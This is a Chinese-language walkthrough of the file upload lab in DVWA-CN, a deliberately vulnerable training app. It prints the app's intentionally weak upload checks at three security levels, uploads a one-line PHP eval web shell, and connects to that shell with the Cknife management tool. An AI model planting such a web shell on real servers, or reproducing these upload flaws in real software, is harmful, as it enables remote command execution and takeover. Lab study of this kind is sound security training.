#dvwacn之十文件上传

dvwacn之文件上传物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/upload/source# ls
high.php  low.php  medium.php
```


##安全级别

- low.php

```
<?php
	if (isset($_POST['Upload'])) {

			$target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
			$target_path = $target_path . basename( $_FILES['uploaded']['name']);

			if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
				
				$html .= '<pre>';
				$html .= '上传失败.';
				$html .= '</pre>';
				
      		} else {
			
				$html .= '<pre>';
				$html .= $target_path . '上传成功!';
				$html .= '</pre>';
				
			}

		}
?>
```

- medium.php 

```
<?php
	if (isset($_POST['Upload'])) {

			$target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
			$target_path = $target_path . basename($_FILES['uploaded']['name']);
			$uploaded_name = $_FILES['uploaded']['name'];
			$uploaded_type = $_FILES['uploaded']['type'];
			$uploaded_size = $_FILES['uploaded']['size'];

			if (($uploaded_type == "image/jpeg") && ($uploaded_size < 100000)){


				if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
				
					$html .= '<pre>';
					$html .= '上传失败.';
					$html .= '</pre>';
					
      			} else {
				
					$html .= '<pre>';
					$html .= $target_path . ' 上传成功!';
					$html .= '</pre>';
					
					}
			}
			else{
				echo '<pre>上传失败.</pre>';
			}
		}
?>
```


- high.php

``` 
<?php
if (isset($_POST['Upload'])) {

			$target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
			$target_path = $target_path . basename($_FILES['uploaded']['name']);
			$uploaded_name = $_FILES['uploaded']['name'];
			$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);
			$uploaded_size = $_FILES['uploaded']['size'];

			if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") && ($uploaded_size < 100000)){


				if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
					
					$html .= '<pre>';
					$html .= '上传失败.';
					$html .= '</pre>';
				
      			} else {
				
					$html .= '<pre>';
					$html .= $target_path . ' 上传成功!';
					$html .= '</pre>';
					
					}
			}
			
			else{
				
				$html .= '<pre>';
				$html .= '上传失败.';
				$html .= '</pre>';

			}
		}

?>
```


##文件上传

直接选择/tmp/mm.php文件上传

mm.php文件内容

```
<?php @eval($_POST['cmd']);?>
```

页面返回

```
../../hackable/uploads/mm.php上传成功!
```
##利用工具

Cknife

https://github.com/xiongjungit/Cknife

上传文件url地址

http://192.168.56.80/dvwacn/hackable/uploads/mm.php

打开Cknife

```
添加地址：
http://192.168.56.80/dvwacn/hackable/uploads/mm.php

参数：
cmd

配置：
<T>MYSQL</T>
<H>localhost</H>
<U>root</U>
<P>123456</P>
<L>utf8</L>
```

右键-->文件管理